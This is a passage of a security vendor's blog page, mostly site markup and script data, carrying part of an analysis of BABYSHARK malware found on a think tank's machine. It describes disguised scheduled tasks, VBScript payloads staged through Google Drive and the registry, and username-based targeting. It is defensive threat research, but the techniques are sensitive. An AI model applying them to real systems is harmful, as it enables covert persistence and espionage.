tabindex="0">Blog</a><a href="/upcoming-events" class="footer-nav-item" tabindex="0">Upcoming Events</a><a href="https://support.huntress.io/hc/en-us" target="_blank" class="footer-nav-item" tabindex="0">Support Documentation</a></nav></div><div data-hover="false" data-delay="0" data-w-id="8db5101a-d165-e0e7-c7a6-e04b3059537c" class="footer-col w-dropdown"><div class="footer-title-container w-dropdown-toggle " id="w-dropdown-toggle-9" aria-controls="w-dropdown-list-9" aria-haspopup="menu" aria-expanded="true" role="button" tabindex="0"><h5 class="footer-title">About</h5><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fec8c1f5fc9134c75bd9877ca0323392a" loading="lazy" alt="down arrow" class="footer-caret"/></div><nav class="footer-nav-item-container w-dropdown-list footer-column " id="w-dropdown-list-9" aria-labelledby="w-dropdown-toggle-9"><a href="/company/our-company" class="footer-nav-item" tabindex="0">Our Company</a><a href="/company/leadership" class="footer-nav-item" tabindex="0">Leadership</a><a href="/company/press" class="footer-nav-item" tabindex="0">News &amp; Press</a><a href="/company/careers" class="footer-nav-item" tabindex="0">Careers</a><a href="/contact-us" class="footer-nav-item" tabindex="0">Contact Us</a></nav></div></div><div id="w-node-_8db5101a-d165-e0e7-c7a6-e04b3059538b-3059534f" class="footer-gradient-line"></div><div class="footer-copyright-grid"><div id="w-node-_8db5101a-d165-e0e7-c7a6-e04b3059538d-3059534f" class="fcg-col"><a href="/" class="footer-brand w-inline-block"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b2e3c89b5046b89682ef20ccb7218d" loading="lazy" alt="Hunteress white logo"/></a></div><div id="w-node-_8db5101a-d165-e0e7-c7a6-e04b30595390-3059534f" class="fcg-col md-order-2"><div class="extra-small-paragraph">© 2025 Huntress All Rights Reserved.</div><div class="fcg-cta-group"><a href="/privacy-policy" target="_blank" class="fcg-cta">Privacy Policy</a><div class="fcg-seperator">|</div><a href="/cookie-policy" target="_blank" class="fcg-cta">Cookie Policy</a><div class="fcg-seperator">|</div><a href="/terms-of-use" target="_blank" class="fcg-cta">Terms of Use</a></div></div><div id="w-node-_8db5101a-d165-e0e7-c7a6-e04b3059539a-3059534f" class="fcg-col md-order-3"><a id="free_trial_footer_button" href="/start-trial" class="primary-button footer-cta w-button">Free Trial</a></div></div></div></footer></div><script>((storageKey2, restoreKey) => {
    if (!window.history.state || !window.history.state.key) {
      let key = Math.random().toString(32).slice(2);
      window.history.replaceState({ key }, "");
    }
    try {
      let positions = JSON.parse(sessionStorage.getItem(storageKey2) || "{}");
      let storedY = positions[restoreKey || window.history.state.key];
      if (typeof storedY === "number") {
        window.scrollTo(0, storedY);
      }
    } catch (error) {
      console.error(error);
      sessionStorage.removeItem(storageKey2);
    }
  })("react-router-scroll-positions", null)</script><script>window.__reactRouterContext = {"basename":"/","future":{"unstable_middleware":false,"unstable_optimizeDeps":false,"unstable_splitRouteModules":false,"unstable_subResourceIntegrity":false,"unstable_viteEnvironmentApi":false},"routeDiscovery":{"mode":"lazy","manifestPath":"/__manifest"},"ssr":true,"isSpaMode":false};window.__reactRouterContext.stream = new ReadableStream({start(controller){window.__reactRouterContext.streamController = controller;}}).pipeThrough(new TextEncoderStream());</script><script type="module" async="">;
import * as route0 from "/assets/root-CxA1SAwR.js";
import * as route1 from "/assets/blog._slug-DGtNaz02.js";
  window.__reactRouterManifest = {
  "entry": {
    "module": "/assets/entry.client-SQ3q5yjc.js",
    "imports": [
      "/assets/chunk-D4RADZKF-LqBHOxl5.js",
      "/assets/index-DJsMTf3_.js"
    ],
    "css": []
  },
  "routes": {
    "root": {
      "id": "root",
      "path": "",
      "hasAction": false,
      "hasLoader": true,
      "hasClientAction": false,
      "hasClientLoader": false,
      "hasClientMiddleware": false,
      "hasErrorBoundary": true,
      "module": "/assets/root-CxA1SAwR.js",
      "imports": [
        "/assets/chunk-D4RADZKF-LqBHOxl5.js",
        "/assets/index-DJsMTf3_.js",
        "/assets/root-CMTQ8QH5.js",
        "/assets/with-props-zRNoRGa1.js",
        "/assets/blocks-exports-Ds8r2STp.js"
      ],
      "css": [
        "/assets/root-C5LLCb9u.css",
        "/assets/blocks-exports-DgxdbFYj.css"
      ]
    },
    "routes/blog.$slug": {
      "id": "routes/blog.$slug",
      "parentId": "root",
      "path": "blog/:slug",
      "hasAction": false,
      "hasLoader": true,
      "hasClientAction": false,
      "hasClientLoader": false,
      "hasClientMiddleware": false,
      "hasErrorBoundary": false,
      "module": "/assets/blog._slug-DGtNaz02.js",
      "imports": [
        "/assets/with-props-zRNoRGa1.js",
        "/assets/chunk-D4RADZKF-LqBHOxl5.js",
        "/assets/blocks-exports-Ds8r2STp.js",
        "/assets/metadata-DVv6nMOk.js",
        "/assets/index-DJsMTf3_.js"
      ],
      "css": [
        "/assets/blocks-exports-DgxdbFYj.css",
        "/assets/metadata-BxXzbT5t.css"
      ]
    },
    "routes/($slug)._index": {
      "id": "routes/($slug)._index",
      "parentId": "root",
      "path": ":slug?",
      "index": true,
      "hasAction": false,
      "hasLoader": true,
      "hasClientAction": false,
      "hasClientLoader": false,
      "hasClientMiddleware": false,
      "hasErrorBoundary": false,
      "module": "/assets/(_slug)._index-CSrWRVX8.js",
      "imports": [
        "/assets/with-props-zRNoRGa1.js",
        "/assets/chunk-D4RADZKF-LqBHOxl5.js",
        "/assets/blocks-exports-Ds8r2STp.js",
        "/assets/metadata-DVv6nMOk.js",
        "/assets/index-DJsMTf3_.js"
      ],
      "css": [
        "/assets/blocks-exports-DgxdbFYj.css",
        "/assets/metadata-BxXzbT5t.css"
      ]
    },
    "routes/blog._index": {
      "id": "routes/blog._index",
      "parentId": "root",
      "path": "blog",
      "index": true,
      "hasAction": true,
      "hasLoader": true,
      "hasClientAction": false,
      "hasClientLoader": true,
      "hasClientMiddleware": false,
      "hasErrorBoundary": false,
      "module": "/assets/blog._index-VXmRYwDm.js",
      "imports": [
        "/assets/with-props-zRNoRGa1.js",
        "/assets/chunk-D4RADZKF-LqBHOxl5.js",
        "/assets/blocks-exports-Ds8r2STp.js",
        "/assets/metadata-DVv6nMOk.js",
        "/assets/data-Bv-PP9xb.js",
        "/assets/index-DJsMTf3_.js"
      ],
      "css": [
        "/assets/blocks-exports-DgxdbFYj.css",
        "/assets/metadata-BxXzbT5t.css"
      ]
    }
  },
  "url": "/assets/manifest-8811e0e9.js",
  "version": "8811e0e9"
};
  window.__reactRouterRouteModules = {"root":route0,"routes/blog.$slug":route1};

import("/assets/entry.client-SQ3q5yjc.js");</script><!--$?--><template id="B:0"></template><!--/$--><div hidden id="S:0"><script>window.__reactRouterContext.streamController.enqueue("[{\"_1\":2,\"_432\":-5,\"_433\":-5},\"loaderData\",{\"_3\":4,\"_7\":8},\"root\",{\"_5\":6},\"preprod\",false,\"routes/blog.$slug\",{\"_9\":10,\"_160\":179,\"_300\":301,\"_318\":319,\"_320\":321,\"_430\":431},\"page\",{\"_11\":12,\"_13\":14,\"_15\":16,\"_17\":18,\"_19\":20,\"_21\":21,\"_22\":23,\"_36\":37,\"_47\":48,\"_163\":164,\"_165\":166,\"_167\":14,\"_168\":169,\"_170\":171,\"_172\":173,\"_174\":173,\"_175\":176,\"_177\":178},\"folders\",[],\"createdDate\",1737878646725,\"id\",\"65f3299e49a461b4b9c729ba\",\"name\",\"Blog Post\",\"modelId\",\"3fa669f9656b425bbe84446dd9c5a7cd\",\"published\",\"meta\",{\"_24\":9,\"_25\":6,\"_26\":27,\"_28\":29},\"kind\",\"hasLinks\",\"lastPreviewUrl\",\"https://prod.huntress.com/blog/(slug)?builder.space=3eb6f92aedf74f109c7b4b0897ec39a8\u0026builder.user.permissions=read%2Ccreate%2Cpublish%2CeditCode%2CeditDesigns%2Cadmin%2CeditLayouts%2CeditLayers%2CeditContentPriority\u0026builder.user.role.name=Admin\u0026builder.user.role.id=admin\u0026builder.cachebust=true\u0026builder.preview=page\u0026builder.noCache=true\u0026builder.allowTextEdit=true\u0026__builder_editing__=true\u0026builder.overrides.page=65f3299e49a461b4b9c729ba\u0026builder.overrides.65f3299e49a461b4b9c729ba=65f3299e49a461b4b9c729ba\u0026builder.options.includeRefs=true\u0026builder.options.enrich=true\",\"breakpoints\",{\"_30\":31,\"_32\":33,\"_34\":35},\"xsmall\",479,\"small\",767,\"medium\",991,\"query\",[38],{\"_39\":40,\"_41\":42,\"_43\":44,\"_45\":46},\"@type\",\"@builder.io/core:Query\",\"property\",\"urlPath\",\"operator\",\"is\",\"value\",\"/blog/(slug)\",\"data\",{\"_49\":50,\"_51\":50,\"_52\":50,\"_53\":46,\"_54\":50,\"_55\":50,\"_56\":57,\"_58\":50,\"_59\":50,\"_60\":61,\"_152\":153},\"titleTag\",\"\",\"openGraphTitle\",\"metaDescription\",\"url\",\"openGraphDescription\",\"description\",\"templateDataModel\",\"blog-posts\",\"title\",\"slug\",\"blocks\",[62,96,105,129],{\"_39\":63,\"_64\":65,\"_15\":66,\"_67\":68,\"_82\":83},\"@builder.io/sdk:Element\",\"@version\",2,\"builder-ddebc027a2b547be8bb340dc4719efa5\",\"component\",{\"_17\":69,\"_70\":71},\"BlogBannerSection\",\"options\",{\"_72\":73,\"_74\":75,\"_76\":77,\"_78\":79,\"_80\":81},\"_data\",\"hunting-for-m365-password-spraying\",\"SidebarCtaHeading\",\"See Huntress in action\",\"SidebarCtaText\",\"\u003cp\u003eOur platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC).\u003c/p\u003e\",\"SidebarCtaButtonText\",\"Book a Demo\",\"SidebarCtaButtonUrl\",\"/demo\",\"responsiveStyles\",{\"_84\":85},\"large\",{\"_86\":87,\"_88\":89,\"_90\":91,\"_92\":93,\"_94\":95},\"display\",\"flex\",\"flexDirection\",\"column\",\"position\",\"relative\",\"flexShrink\",\"0\",\"boxSizing\",\"border-box\",{\"_39\":63,\"_64\":65,\"_15\":97,\"_67\":98,\"_82\":103},\"builder-2b27cff7899944738e3b3d18be93d1f3\",{\"_17\":99,\"_70\":100},\"BlogRelatedResourcesSection\",{\"_101\":102},\"heading\",\"You Might Also Like\",{\"_84\":104},{\"_86\":87,\"_88\":89,\"_90\":91,\"_92\":93,\"_94\":95},{\"_39\":63,\"_64\":65,\"_15\":106,\"_67\":107,\"_82\":127},\"builder-0f50d623022042208a513ab79514b79b\",{\"_17\":108,\"_70\":109},\"BlogSignupSection\",{\"_101\":110,\"_111\":112,\"_113\":114,\"_115\":116},\"Sign Up for Huntress Updates\",\"summary\",\"Get insider access to Huntress tradecraft, killer events, and the freshest blog updates.\",\"image\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcb5efa5143804ba59d530a903d29fe5f\",\"blogSignupForm\",{\"_117\":118,\"_119\":6,\"_120\":121,\"_122\":123,\"_124\":6,\"_125\":6,\"_126\":6},\"formId\",\"wf-form-Blog-Signup-Form\",\"showFormTitle\",\"submitButtonText\",\"Submit\",\"hubspotFormId\",\"5198e52f-a296-4d78-935d-fe864d69a67a\",\"showBlueGreenGradient\",\"showBluePurpleGradient\",\"useNeverBounce\",{\"_84\":128},{\"_86\":87,\"_88\":89,\"_90\":91,\"_92\":93,\"_94\":95},{\"_15\":130,\"_39\":63,\"_131\":132,\"_133\":134,\"_82\":144},\"builder-pixel-cocjac87fzf\",\"tagName\",\"img\",\"properties\",{\"_135\":136,\"_137\":138,\"_139\":50,\"_140\":141,\"_142\":93,\"_143\":93},\"src\",\"https://cdn.builder.io/api/v1/pixel?apiKey=3eb6f92aedf74f109c7b4b0897ec39a8\",\"aria-hidden\",\"true\",\"alt\",\"role\",\"presentation\",\"width\",\"height\",{\"_84\":145},{\"_143\":93,\"_142\":93,\"_86\":146,\"_147\":93,\"_148\":149,\"_150\":151},\"inline-block\",\"opacity\",\"overflow\",\"hidden\",\"pointerEvents\",\"none\",\"state\",{\"_154\":84,\"_155\":156},\"deviceSize\",\"location\",{\"_157\":46,\"_158\":159,\"_36\":162},\"pathname\",\"path\",[160,161],\"blog\",\"(slug)\",{},\"variations\",{},\"lastUpdated\",1744209521320,\"firstPublished\",\"testRatio\",1,\"screenshot\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fbe618a449bd34227a4c9c360a7241568\",\"createdBy\",\"Kz459QsZDzNpORbTSiA9L6WRQc23\",\"lastUpdatedBy\",\"rev\",\"kqn2zob2bab\",\"template\",\"huntress\",{\"_36\":180,\"_11\":181,\"_13\":182,\"_15\":183,\"_17\":184,\"_19\":185,\"_21\":21,\"_22\":186,\"_47\":188,\"_163\":296,\"_165\":297,\"_167\":182,\"_168\":169,\"_172\":298,\"_174\":298,\"_175\":299},[],[],1742717183941,\"65f3299e49a461b4b9c72de6\",\"Targeted APT Activity: BABYSHARK Is Out for Blood\",\"beafe50240af45639f2b59e6aefd89f9\",{\"_28\":187,\"_24\":47,\"_26\":50},{\"_30\":31,\"_32\":33,\"_34\":35},{\"_17\":184,\"_189\":190,\"_191\":192,\"_193\":194,\"_199\":200,\"_222\":6,\"_223\":224,\"_225\":-5,\"_59\":226,\"_218\":227,\"_228\":229},\"content\",\"\u003cp\u003e\u003cstrong\u003etl;dr: \u003c/strong\u003eThis blog follows the ThreatOps investigation of targeted DPRK (North Korean) backed cyber espionage efforts against Nuclear Think Tanks. It details the threat hunt from beginning to end, including how our ThreatOps analysts found the threat, how our team peeled back the layers to analyze the malicious activity and how the threat actors phished their way into the partner's network in the first place. Scroll to the bottom for indicators of compromise.\u003c/p\u003e\u003cp\u003eOn February 16, Huntress discovered malicious and targeted advanced persistent threat (APT) activity within a \u003ca href=\\\"https://huntress.com/trial\\\" target=\\\"_blank\\\"\u003etrialing partner\u003c/a\u003e organization. This activity aligns with known tradecraft attributed to North Korean threat actors targeting national security think tanks.\u003c/p\u003e\u003cp\u003eThe uncovered malware family, dubbed \u003ca href=\\\"https://attack.mitre.org/software/S0414/\\\" target=\\\"_blank\\\"\u003eBABYSHARK\u003c/a\u003e by other researchers, is used by a DPRK state-sponsored threat actor. This variant was significantly customized and tailored to the specific victim environment, indicating a targeted attack.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn this blog, we'll pull back the curtain on the technical details, our internal process of investigation and the lessons learned for the greater security community.\u003c/p\u003e\u003ch2\u003eRight of Boom and Backwards\u003c/h2\u003e\u003cp\u003eThis story begins with our tried-and-true service: \u003ca href=\\\"/defenders-handbook/persistence-in-cybersecurity\\\" target=\\\"_blank\\\"\u003edetecting persistence\u003c/a\u003e, or how hackers establish and maintain access to their victim.\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:813px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"813px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435\\\" alt=\\\"image16\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eDiscovering persistence mechanisms keys us in that there was \u003cem\u003eundeniably \u003c/em\u003emalicious threat actor behavior. We start with this scene of the crime, and then work backward, unveiling new clues and breadcrumbs to uncover the full picture.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOnce our 24/7 Security analysts identified the activity, we began an investigation to identify how deep the rabbit hole went.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1470px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1470px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df\\\" alt=\\\"image17\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eOur initial discovery was a scheduled task, masquerading with the name \u003cspan class=\\\"highlight\\\"\u003eGoogleUpdater\u003c/span\u003e that ran a \u003ca href=\\\"https://gist.github.com/JohnHammond/7ed632eb8686ca86b6d8586db4ffc0ba\\\" target=\\\"_blank\\\"\u003e\u003cstrong\u003eVBScript script \u003c/strong\u003e\u003cspan class=\\\"highlight\\\"\u003eqwert.vbs\u003c/span\u003e\u003c/a\u003e. This is a commonly used technique (\u003ca href=\\\"https://attack.mitre.org/techniques/T1036/\\\" target=\\\"_blank\\\"\u003eMITRE ATT\u0026amp;CK T1035.005\u003c/a\u003e) to blend in and avoid detection by sounding like something legitimate—in this case, Google. Using a legitimate file (\u003cspan class=\\\"highlight\\\"\u003ewscript.exe\u003c/span\u003e) to run the malicious script further helps to avoid detection that is based on scanning of the binary that is running.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003eqwert.vbs\u003c/span\u003e included code to reach out to a Google Drive file.\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1610px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1610px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87\\\" alt=\\\"image15\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eViewing this Google Drive file, it turns out to be completely blank: an empty file. Note the lengthy filename at the very top of the display, however.\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1124px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1124px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50\\\" alt=\\\"image9\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eDownloading the page with \u003cspan class=\\\"highlight\\\"\u003ecurl\u003c/span\u003e, we can see the HTML source of the Google Drive page—which does not appear to be overtly malicious upon first glance. But taking a closer look, we uncovered some odd “markers” in the lengthy file name displayed.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:742px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"742px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254\\\" alt=\\\"image26\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eAside from what looked like gibberish, there were the strings “\u003cspan class=\\\"highlight\\\"\u003emanage\u003c/span\u003e” with parentheses following it—almost to look like a function call, as if the parameters d=7 were passed in. Immediately following it was a \u003cspan class=\\\"highlight\\\"\u003ejohnbegin\u003c/span\u003e-- and a significant amount of nonsense characters, and eventually a --\u003cspan class=\\\"highlight\\\"\u003ejohnend\u003c/span\u003e string. The \u003cspan class=\\\"highlight\\\"\u003ejohnbegin\u003c/span\u003e and \u003cspan class=\\\"highlight\\\"\u003ejohnend\u0026nbsp;\u003c/span\u003etext seemed to be delimiters to wrap around the random data… perhaps that was encoded data in some way!\u003c/p\u003e\u003cp\u003eWith that breadcrumb, our ThreatOps team began looking over open-source research online to determine if others have seen these “\u003cspan class=\\\"highlight\\\"\u003ejohnbegin\u003c/span\u003e” and “\u003cspan class=\\\"highlight\\\"\u003ejohnend\u003c/span\u003e” markings.\u003c/p\u003e\u003cp\u003eNorth Korea's recent BabyShark malware works with the fileless technique by downloading encrypted malicious scripts from Google drive. Malicious scripts distinguish between start and end with \\\"\u003cspan class=\\\"highlight\\\"\u003ejohnbegin\u003c/span\u003e\\\" and \\\"\u003cspan class=\\\"highlight\\\"\u003ejohnend\u003c/span\u003e\\\". \u003ca href=\\\"https://t.co/6INRjQeecs\\\" target=\\\"_blank\\\"\u003epic.twitter.com/6INRjQeecs\u003c/a\u003e\u003c/p\u003e\u003cblockquote\u003e— IssueMakersLab (@issuemakerslab) \u003ca href=\\\"https://twitter.com/issuemakerslab/status/1241250182810857480?ref_src=twsrc%5Etfw\\\" target=\\\"_blank\\\"\u003eMarch 21, 2020\u003c/a\u003e\u003c/blockquote\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eThanks to some shared intelligence by \u003ca href=\\\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\\\" target=\\\"_blank\\\"\u003ePalo Alto\u003c/a\u003e’s Unit42, \u003ca href=\\\"https://malware.news/t/understanding-detecting-c2-frameworks-babyshark/49865\\\" target=\\\"_blank\\\"\u003emalware reporting sites\u003c/a\u003e\u0026nbsp;and \u003ca href=\\\"https://twitter.com/issuemakerslab/status/1241250182810857480\\\" target=\\\"_blank\\\"\u003eothers\u003c/a\u003e, we were able to discover that these delimiters were key indicators of a strain of malware dubbed BABYSHARK, known for being used by North Korean state-sponsored threat actors.\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-center\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"center\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2\\\" alt=\\\"image1\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eDoing our due diligence to read up on the great analysis and research from those who have seen this in the wild before us, it was clear the previous sightings dated back to the 2018-2019 timeframe. For this specific incident, the first indicators of compromise we uncovered were in March of 2021.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eKnowing that we were now digging into a malicious APT activity, we deployed our \u003c/strong\u003e\u003ca href=\\\"/blog/threat-recap-process-insights-trial-by-fire\\\" target=\\\"_blank\\\"\u003e\u003cstrong\u003eProcess Insights\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e functionality to this host and organization for even greater visibility.\u003c/strong\u003e\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003ePeeling Back the Layers\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eWith a better understanding of what we were looking at, we continued to dig through the \u003cspan class=\\\"highlight\\\"\u003eqwert.vbs\u003c/span\u003e sample.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFrom reading the code, we could see that this scheduled VBScript would download the contents of this Google Drive page on first execution and carve out the obfuscated data between the \u003cspan class=\\\"highlight\\\"\u003ejohnbegin\u003c/span\u003e\u0026nbsp;and \u003cspan class=\\\"highlight\\\"\u003ejohnend\u003c/span\u003e delimiters to be saved as a file \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u003c/span\u003e. Later, upon second execution by the scheduled task, the script deobfuscates the saved data and executes it as VBScript.\u003c/p\u003e\u003cp\u003eConsidering we can see the deobfuscation routine, we can run that on our own and unravel \u003ca href=\\\"https://gist.github.com/JohnHammond/32561b448f9d760b2a01dc8b0ce07efd\\\" target=\\\"_blank\\\"\u003ewhat actual code would be present and executed from \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u003c/span\u003e\u003c/a\u003e.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:986px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"986px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02\\\" alt=\\\"image20\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: This screenshot is an excerpt of the code present and the full file can be reviewed with the gist link above.\u003c/p\u003e\u003cp\u003eThere is a \u003cem\u003elot\u003c/em\u003e to unpack and discuss within this VBScript code. We will start with the most interesting observation: the malware \u003cem\u003echecks the current username.\u003c/em\u003e\u003c/p\u003e\u003ch2\u003eThe Cast of Characters\u003c/h2\u003e\u003cp\u003eWe want to emphasize that the observed APT activity is highly targeted against this organization and affiliated individuals.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe target organization fits the category of “think tanks,” as alluded to in the very beginning of this post. Additionally, this target’s computer had a hostname referring to the owner and user—who, for partner confidentiality, we'll refer to as Alex.\u003c/p\u003e\u003cp\u003eAlex's computer was not the only host in this organization that Huntress was supporting—other devices with a hostname based on their user were visible to us, but during the time of our analysis, only Alex's machine was online. To tell the whole story, we knew we needed access to another important user’s machine. We will refer to this user as \u003cstrong\u003eBob.\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eNotice that the \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u003c/span\u003e file \u003cem\u003especifically\u003c/em\u003e checks for the presence of the username “Administrator,” or our newly introduced character, “Bob.” The malware would not run if it was not under Bob. If the current username did \u003cem\u003enot\u003c/em\u003e match either of these two names, the malware will reach out to an HTTP C2 server. The malware will then stop itself from executing on the system.\u003c/p\u003e\u003cp\u003eThis was particularly interesting to us. This attack was tailored to focus only on Bob. If (and only if) the username matched Bob, then it would add persistence mechanisms in the Windows registry, stage new obfuscated files, and continue communications with its C2 servers.\u003c/p\u003e\u003ch2\u003eFollowing Breadcrumbs\u003c/h2\u003e\u003cp\u003eNoting the newly discovered activity from \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u003c/span\u003e,\u0026nbsp; we found several other persistence mechanisms on the host. We discovered the scheduled task named \u003cspan class=\\\"highlight\\\"\u003eMicrosoft-Windows-UpdateDefender\u003c/span\u003e that used another VBS script called \u003cspan class=\\\"highlight\\\"\u003esys0.vbs\u003c/span\u003e to open up a registry key \u003cspan class=\\\"highlight\\\"\u003eHKEY_CURRENT_USER\\\\Software\\\\RegisteredApplications\\\\[random]\u003c/span\u003e and perform some string replacement on the data stored there and execute the contents.\u003c/p\u003e\u003cp\u003e(This filename \u003cspan class=\\\"highlight\\\"\u003esys0.vbs\u003c/span\u003e differs from the suggested \u003cspan class=\\\"highlight\\\"\u003esys1.vbs\u003c/span\u003e name in the recovered \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u0026nbsp;\u003c/span\u003escript, but after finding both renditions on different hosts, both contain \u003ca href=\\\"https://gist.github.com/JohnHammond/d59b9dc0858c4e0e7a1216f7a7eab636\\\" target=\\\"_blank\\\"\u003ethe same contents\u003c/a\u003e).\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1734px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1734px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747\\\" alt=\\\"image4\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eExamining the contents of the task file showed that the commands were executed every 29 minutes, while \u003cspan class=\\\"highlight\\\"\u003esys1.vbs\u003c/span\u003e\u0026nbsp;would be executed every 61 minutes.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1480px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1480px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012\\\" alt=\\\"image6\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThis was also confirmed by looking at the data collected by \u003cem\u003eProcess Insights\u003c/em\u003e. Process Insights is the newest addition to The Huntress Managed Security Platform, offering greater visibility and telemetry on actions performed on an endpoint \u003cem\u003eat the process level.\u003c/em\u003e This captures information like process spawn time, origination, path and any subsequent child process data—in real-time. 😉\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1999px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1999px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable 